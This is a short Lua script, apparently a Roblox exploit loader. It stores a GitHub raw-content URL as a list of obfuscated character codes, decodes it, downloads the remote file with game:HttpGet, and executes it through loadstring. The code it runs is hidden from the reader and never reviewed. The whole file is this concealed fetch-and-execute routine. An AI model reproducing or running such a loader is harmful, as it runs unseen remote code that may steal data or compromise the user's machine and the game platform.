
local encoded = {
104,116,116,112,115,58,47,47,
114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,
47,98,117,98,105,105,50,48,55,54,52,50,50,53,50,56,45,99,112,117,
47,97,100,109,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,77,55,46,86,49,46,108,117,97
}

local url = ""
for _, v in ipairs(encoded) do
    url = url .. string.char(v)
end

local success, err = pcall(function()
    local source = game:HttpGet(url)
    assert(#source > 0, "Empty source")
    local fn = assert(loadstring(source))
    return fn()
end)

if not success then
    warn("M7.V1 ERROR: " .. tostring(err))
end
